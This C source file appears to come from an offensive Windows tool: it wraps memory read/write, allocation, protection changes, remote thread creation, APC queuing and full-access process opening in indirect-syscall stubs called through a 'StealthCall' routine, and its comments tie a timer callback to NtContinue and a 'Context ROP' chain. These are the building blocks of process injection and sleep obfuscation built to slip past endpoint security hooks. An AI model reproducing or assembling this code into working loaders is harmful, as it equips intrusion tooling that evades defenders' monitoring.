#include "..\helper.h"

#include "wrappers.h"

BOOL WrapperReadProcessMemory(HANDLE hProcess, LPCVOID lpBaseAddress, LPVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesRead) {
    DWORD ssn = 0;
    PVOID target = NULL;
    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), _NtReadVirtualMemory, &ssn, &target);

    if (!target) return FALSE;

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 5,
        (UINT64)hProcess,
        (UINT64)lpBaseAddress,
        (UINT64)lpBuffer,
        (UINT64)nSize,
        (UINT64)lpNumberOfBytesRead);

    if (status != 0) {
        printf("[-] NtReadVirtualMemory failed: 0x%08X at address %p\n", status, lpBaseAddress);
        return FALSE;
    }

    return TRUE;
}

BOOL WrapperWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten) {
    DWORD dwNtWriteSSN = 0;
    PVOID pNtWriteSyscallPtr = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");

    getInDirectSyscallStub(hNtdll, _NtWriteVirtualMemory, &dwNtWriteSSN, &pNtWriteSyscallPtr);

    if (!pNtWriteSyscallPtr) {
        return FALSE;
    }

    NTSTATUS status = (NTSTATUS)StealthCall(
        dwNtWriteSSN, 
        pNtWriteSyscallPtr, 
        5,
        (UINT64)hProcess, 
        (UINT64)lpBaseAddress, 
        (UINT64)lpBuffer, 
        (UINT64)nSize, 
        (UINT64)lpNumberOfBytesWritten
    );

    if (status != 0) {
        printf("[-] NtWriteVirtualMemory failed: 0x%08X at address %p\n", status, lpBaseAddress);
        return FALSE;
    }

    return TRUE;
}

LPVOID WrapperVirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, _NtAllocateVirtualMemory, &ssn, &target);

    if (!target) return NULL;

    // Variables locales car NtAllocateVirtualMemory modifie les valeurs (Passage par pointeur)
    LPVOID baseAddress = lpAddress;
    SIZE_T regionSize = dwSize;

    // NtAllocateVirtualMemory(ProcessHandle, *BaseAddress, ZeroBits, *RegionSize, AllocationType, Protect)
    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 6, 
        (UINT64)hProcess, 
        (UINT64)&baseAddress, 
        (UINT64)0, 
        (UINT64)&regionSize, 
        (UINT64)flAllocationType, 
        (UINT64)flProtect);

    if (status != 0) return NULL;

    return baseAddress; // Retourne l'adresse allouée (comme Win32)
}

BOOL WrapperVirtualProtectEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, _NtProtectVirtualMemory, &ssn, &target);

    if (!target) return FALSE;

    // NtProtectVirtualMemory(hProcess, &lpAddress, &dwSize, flNewProtect, lpflOldProtect)
    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 5, 
        (UINT64)hProcess, (UINT64)&lpAddress, (UINT64)&dwSize, (UINT64)flNewProtect, (UINT64)lpflOldProtect);

    return (status == 0);
}

BOOL WrapperCreateRemoteThreadEx(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, SIZE_T dwStackSize, PHANDLE phThread) {
    DWORD ssn = 0; PVOID target = NULL;
    getInDirectSyscallStub(CustomGetModuleHandleW(L"ntdll.dll"), _NtCreateThreadEx, &ssn, &target);
    if (!target) return FALSE;

    // Conversion Win32 CREATE_SUSPENDED (0x4) -> NT_SUSPENDED (0x1)
    ULONG ntFlags = (dwCreationFlags & 0x00000004) ? 0x1 : 0x0;

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 11, 
        (UINT64)phThread, (UINT64)THREAD_ALL_ACCESS, (UINT64)NULL, (UINT64)hProcess, 
        (UINT64)lpStartAddress, (UINT64)lpParameter, (UINT64)ntFlags, (UINT64)0, (UINT64)dwStackSize, (UINT64)0, (UINT64)NULL);

    return (status == 0);
}

BOOL WrapperQueueUserAPC(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, _NtQueueApcThread, &ssn, &target);

    if (!target) return FALSE;

    // NtQueueApcThread(hThread, pfnAPC, dwData, NULL, NULL)
    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 5, 
        (UINT64)hThread, (UINT64)pfnAPC, (UINT64)dwData, (UINT64)NULL, (UINT64)NULL);

    return (status == 0);
}

BOOL WrapperResumeThread(HANDLE hThread) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, _NtResumeThread, &ssn, &target);

    ULONG suspendCount = 0;
    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 2, (UINT64)hThread, (UINT64)&suspendCount);

    return (status == 0);
}

HANDLE WrapperOpenProcess(DWORD dwPid) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, _NtOpenProcess, &ssn, &target);

    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId;

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    clientId.UniqueProcess = (HANDLE)(UINT_PTR)dwPid;
    clientId.UniqueThread = 0;

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 4, 
        (UINT64)&hProcess, (UINT64)PROCESS_ALL_ACCESS, (UINT64)&objAttr, (UINT64)&clientId);

    return (status == 0) ? hProcess : NULL;
}

BOOL WrapperWaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, _NtWaitForSingleObject, &ssn, &target);

    LARGE_INTEGER timeout;
    timeout.QuadPart = -(LONGLONG)dwMilliseconds * 10000; // Conversion en temps relatif NT

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 3, 
        (UINT64)hHandle, (UINT64)FALSE, (UINT64)(dwMilliseconds == INFINITE ? NULL : &timeout));

    return (status == 0);
}

LPVOID WrapperVirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) {
    return WrapperVirtualAllocEx((HANDLE)-1, lpAddress, dwSize, flAllocationType, flProtect);
}

BOOL WrapperVirtualProtect(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect) {
    LPVOID baseAddr = lpAddress;
    SIZE_T size = dwSize;
    
    return WrapperVirtualProtectEx((HANDLE)-1, baseAddr, size, flNewProtect, lpflOldProtect);
}

HANDLE WrapperCreateThread(LPSECURITY_ATTRIBUTES lpAttr, SIZE_T dwStack, LPTHREAD_START_ROUTINE lpStart, LPVOID lpParam, DWORD dwFlags, LPDWORD lpId) {
    HANDLE hThread = NULL;
    if (WrapperCreateRemoteThreadEx((HANDLE)-1, (LPVOID)lpStart, lpParam, dwFlags, dwStack, &hThread)) {
        if (lpId) *lpId = GetThreadId(hThread);
        return hThread;
    }
    return NULL;
}

HANDLE WrapperCreateEventW(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCWSTR lpName) {
    DWORD ssn = 0; 
    PVOID target = NULL;
    HANDLE hEvent = NULL;
    OBJECT_ATTRIBUTES objAttr;
    
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, _NtCreateEvent, &ssn, &target);

    // Initialize Object Attributes (NULL name for unnamed event)
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 5, 
        &hEvent, 
        EVENT_ALL_ACCESS, 
        &objAttr, 
        bManualReset ? 0 : 1, // 0 for NotificationEvent (Manual), 1 for SynchronizationEvent (Auto)
        (BOOLEAN)bInitialState
    );

    if (status != 0) {
        return NULL;
    }

    return hEvent;
}

HANDLE WrapperCreateTimerQueue() {
    DWORD ssn = 0; 
    PVOID target = NULL;
    HANDLE hTimer = NULL;
    OBJECT_ATTRIBUTES objAttr;
    
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, _NtCreateTimer, &ssn, &target);

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 4, 
        &hTimer, 
        TIMER_ALL_ACCESS, 
        &objAttr, 
        0 // NotificationTimer
    );

    if (status != 0) {
        return NULL;
    }

    return hTimer;
}

BOOL WrapperCreateTimerQueueTimer(PHANDLE phNewTimer, HANDLE hTimerQueue, WAITORTIMERCALLBACK Callback, PVOID Parameter, DWORD DueTime, DWORD Period, ULONG Flags) {
    DWORD ssn = 0; PVOID target = NULL;
    HMODULE hNtdll = CustomGetModuleHandleW(L"ntdll.dll");
    getInDirectSyscallStub(hNtdll, "NtSetTimer", &ssn, &target);

    // COnvert to NTAPI time
    LARGE_INTEGER liDueTime;
    liDueTime.QuadPart = -(LONGLONG)DueTime * 10000; 

    // NtSetTimer(TimerHandle, DueTime, TimerApcRoutine, TimerContext, ResumeTimer, Period, PreviousState)
    NTSTATUS status = (NTSTATUS)StealthCall(ssn, target, 7, 
        hTimerQueue, 
        &liDueTime, 
        Callback,   // Here NtContinue
        Parameter,  // Here Context ROP
        FALSE, 
        0, 
        NULL
    );

    return (status == 0);
}